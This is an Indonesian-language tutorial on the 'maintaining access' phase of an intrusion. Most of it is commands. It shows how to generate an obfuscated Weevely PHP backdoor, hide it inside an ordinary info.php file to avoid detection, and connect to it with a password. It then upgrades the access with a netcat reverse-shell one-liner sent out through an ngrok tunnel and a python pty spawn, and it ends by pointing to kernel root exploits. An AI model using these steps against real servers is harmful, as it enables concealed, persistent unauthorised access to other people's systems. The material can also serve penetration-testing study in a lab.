# Backdoor

Created: June 22, 2022 1:17 PM

Jika kalian untuk mendapatkan akses shell kalian harus membuat akun level user, mengunggah backdoor PHP, lalu mengeksekusi backdoor dan berbagai proses lainnya. Tahap maintaining access merupakan proses untuk membuat jalan alternatif agar bisa terhubung ke sistem target tanpa harus melewati proses yang begitu panjang.

Jalan alternatif bisa dibuat dengan menanamkan backdoor permanen di sistem target. Sedangkan untuk jenis backdoor bisa beragam.

# **Backdoor Berdasarkan Sambungan Jaringan**

Meskipun backdoor hanya sekedar bagaimana membuat jalan pintas bagaimana kita bisa terhubung. Namun kita harus tahu jenis sambungan seperti apa yang bisa sesuai kita gunakan.

[https://lh6.googleusercontent.com/1uubqQY9D_6ngV3ZNORSlLHocSB_GZ5icCWhSKJnIC59hPdHDTdBS2_Z_nECU6moVrwWZGfxZwMcby95nV6YSEOaPAaJN8L1wm2Ld9H4OqyBci1Bbz8srzfo-PqLpW1pe9HZHTula6aIU8mvEJhR8Geg2M4](https://lh6.googleusercontent.com/1uubqQY9D_6ngV3ZNORSlLHocSB_GZ5icCWhSKJnIC59hPdHDTdBS2_Z_nECU6moVrwWZGfxZwMcby95nV6YSEOaPAaJN8L1wm2Ld9H4OqyBci1Bbz8srzfo-PqLpW1pe9HZHTula6aIU8mvEJhR8Geg2M4)

**1. Bind TCP**

Backdoor dengan memanfaatkan konsep binding TCP adalah dimana server dipaksa untuk membuka port TCP tertentu oleh program backdoor.

**2. Reverse Shell**

Sedangkan untuk reverse shell, kondisi dimana komputer milik penyerang membuka port dan ketika penyerang menjalankan backdoor di server target maka server target akan dipaksa untuk menghubungi komputer penyerang.

**Kapan dibutuhkan?**

[Untitled](Backdoor%208c113f3e20b748c288ec065c2c08e91a/Untitled%20Database%2022b317edcf804f7ea2591e57112c31de.csv)

# **Berdasarkan Sambungan Protokol**

Sedangkan untuk berhubungan dengan protokol kita bisa membagi menjadi dua hal yakni stateful dan stateless connections.

**1. Stateless**

Backdoor jenis ini tidak interaktif pada komunikasi antar komputer dan server. Umumnya backdoor ini menggunakan protokol HTTP. Kekurangan backdoor dengan jenis ini biasanya kita bisa menjalankan perintah-perintah shell yang langsung memberikan output. Sebagai contoh: ls, mkdir, cat, cd, dan lain sebagainya.

**2. Stateful**

Penggunaan jenis backdoor ini biasanya digunakan untuk komunikasi yang interaktif secara penuh. Kelebihan backdoor dengan konsep stateful semua perintah bisa kita jalankan tidak terkecuali sudo, vim, nano, dan sebagainya.

Biasanya shell dengan tipe TTY / PTY, dengan mendapatkan tipe shell TTY/PTY kalian bisa secara interaktif bisa berkomunikasi di terminal kalian dan terminal server secara real time baik output maupun input.

# **Menanamkan Backdoor**

Pada tahap gaining access atau exploitation jika kalian menemukan kerentanan File Upload Vulnerability. Kita bisa mengunggah backdoor jenis stateless terlebih dahulu misalnya PHP shell, berhubung pada praktik kita ini menggunakan webserver php maka kita bisa gunakan tool **weevely**.

Weevely merupakan backdoor mutakhir yang memiliki fitur obfuscated untuk menghindari anti virus. Dan juga backdoor ini cukup kecil ringan namun juga sangat memenuhi kebutuhan penyerang. Langkah instalasi Weevely adalah sebagai berikut.

Download Weevely pada komputer Anda. Caranya bisa dengan:

- Download melalui Git file: [https://github.com/epinna/weevely3.git](https://github.com/epinna/weevely3.git)
- Download via HTTP dari browser: [https://github.com/epinna/weevely3/archive/master.zip](https://github.com/epinna/weevely3/archive/master.zip)
- Download via wget (di terminal):

wget https://github.com/epinna/weevely3/archive/master.zip

Akan tetapi, proses ini tidak berlaku apabila kalian menggunakan Kali Linux, karena

# **Generate Backdoor**

Proses ini diperlukan untuk membangkitkan file PHP guna untuk diunggah ke server target. Perintah yang digunakan adalah dengan format sebagai berikut.

```bash
$ weevely generate <password> <namafile>.php
```

Contohnya, kita akan membuat backdoor dengan nama backdoor.php, dengan password pazzWurD. maka perintah yang kita gunakan adalah

```bash
$ weevely generate pazzWurD backdoor.php
```

Selanjutnya, kita masukkan script php ini ke server yang menjadi target kita (apabila kita telah mencapai tahap mendapatkan akses ke server).

[https://lh5.googleusercontent.com/zjtK0NuYELloEM6z2qSNJOPNHSU8vna06sQfAjiG61aR6rCwb_M6w_c8WBZE-7lYa_pRuPHQQWGxtA-ORFrABH2Kn8RWaVS2sGgGAxvIZBl0ROQPNO3vUzSS_v714s5VRd-bi9NXXA5bYwNAtA](https://lh5.googleusercontent.com/zjtK0NuYELloEM6z2qSNJOPNHSU8vna06sQfAjiG61aR6rCwb_M6w_c8WBZE-7lYa_pRuPHQQWGxtA-ORFrABH2Kn8RWaVS2sGgGAxvIZBl0ROQPNO3vUzSS_v714s5VRd-bi9NXXA5bYwNAtA)

Cara lainnya adalah dengan meng-inject script ini ke file yang sifatnya umum, sehingga tidak terdeteksi. Contohnya kita akan masukkan script ini ke info.php, seperti pada gambar dibawah.

[https://lh6.googleusercontent.com/4e8pWVuM77Wpo8qIGBHBXGli0qZffcwTXUg2HDoJrZnW6PfcrkeoOgEXXeh-KWXUDKDZWfC5yHPo1rNEeDAx2dnGLeq1eGSPhhkhrnFKBiWJ2DKQ-Re4SJp8lhc2jtP62DT6bSWBGwFSswWgCw](https://lh6.googleusercontent.com/4e8pWVuM77Wpo8qIGBHBXGli0qZffcwTXUg2HDoJrZnW6PfcrkeoOgEXXeh-KWXUDKDZWfC5yHPo1rNEeDAx2dnGLeq1eGSPhhkhrnFKBiWJ2DKQ-Re4SJp8lhc2jtP62DT6bSWBGwFSswWgCw)

# **Access Backdoor**

Pada kasus di bagian sebelumnya, kita sudah mengcopy backdoor ke info.php. Kalau kita akses info.php, memang sepertinya tidak ada yang berubah (lihat gambar dibawah)

[https://lh3.googleusercontent.com/eg5cjZW5_1hhs-qYLKj7BqkJZVfNfg23cB_vlul45IHWBqAeubjlmPpP6kVfwvlnsgIgHp9hSXNus08o2GTOkH0OwaB2MdqWLXclWjdWg4NUuyjjIWACRkeBUwd39HOmwdD37B0aHtlpoIigSA](https://lh3.googleusercontent.com/eg5cjZW5_1hhs-qYLKj7BqkJZVfNfg23cB_vlul45IHWBqAeubjlmPpP6kVfwvlnsgIgHp9hSXNus08o2GTOkH0OwaB2MdqWLXclWjdWg4NUuyjjIWACRkeBUwd39HOmwdD37B0aHtlpoIigSA)

Selanjutnya, untuk mengakses backdoor, kita cukup menggunakan perintah dengan format berikut. Hanya orang yang memiliki password yang bisa mengakses backdoor tersebut. Jadi jangan sampai lupa ya password nya !

```bash
$ weevely <**url**> <**password**>
```

Pada studi kasus yang kita lakukan, maka perintah yang harus kita masukkan adalah

```bash
weevely http://localhost/info.php pazzWurD
```

# **Upgrade to Stateful dengan Bind TCP**

Proses ini diperlukan agar kalian bisa mendapatkan akses shell interaktif atau lebih dikenal dengan TTY / PTY (pseudo terminal)

```bash
$ :backdoor_tcp -shell /bin/bash -vector <netcat,netcat_bsd,python_pty,socat> <port>
```

# **Upgrade to Stateful dengan Reverse TCP**

Proses ini membutuhkan IP Public atau domain agar bisa melakukan reverse tcp shell. Kita bisa memanfaatkan ngrok agar bisa mendapatkan TCP tunnel yang dilewatkan ke komputer kita.

Oh iya jika kalian belum pernah memasang ngrok di kali linux. Kalian bisa mengikuti panduan pemasangan disini [https://ngrok.com/download](https://ngrok.com/download).

Pada terminal 2 di kali linux silahkan persiapkan terminal dengan menggunakan Netcat-traditional:

```bash
$ nc -lvp 45456
```

Jika terjadi error mungkin disebabkan netcat yang kalian pasang adalah netcat-openbsd, kalian bisa gunakan alternatif perintah berikut:

```bash
$ nc -l 127.0.0.1 45456
```

Pada terminal 3 di kali linux silahkan persiapkan ngrok TCP tunnel dengan perintah berikut:

```bash
$ ./ngrok tcp 45456
```

```bash
ngrok by @inconshreveable
(Ctrl+C to quit)

Session Status            	reconnecting (session closed)
Account                   	danang.heriyadi19@gmail.com (Plan: Free)
Version                   	2.3.35
Region                    	United States (us)
Web Interface             	http://127.0.0.1:4040
Forwarding                	tcp://2.tcp.ngrok.io:14953 -> localhost:31337

Connections               	ttl 	opn 	rt1 	rt5 	p50 	p90
                            1   	0   	0.00	0.00	24.80   24.80
```

Di output ngrok diatas didapatkan domain public kalian adalah **2.tcp.ngrok.io** dengan port **14953**.

Pada terminal 1 di kali linux kalian yang menjalankan weevely bisa kita lakukan proses upgrade shell ke TTY terminal dengan perintah berikut :

```bash
$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 0.tcp.ngrok.io 12582 >/tmp/f
```

Kemudian silahkan buka terminal 2 dimana kalian sebelumnya menjalankan netcat akan muncul output berikut :

```bash
/bin/sh: 0: can't access tty; job control turned off$
```

Kita sudah berhasil mendapatkan akses terminal interaktif dengan metode Reverse TCP. Langkah terakhir agar bisa mendapatkan shell PTY kita bisa jalankan perintah berikut :

```bash
$ python -c "import pty; pty.spawn('/bin/bash');"
```

Setelah proses ini kalian sudah bisa untuk berusaha mendapatkan akses yang lebih tinggi misalnya dengan mencoba berbagai kernel root exploit.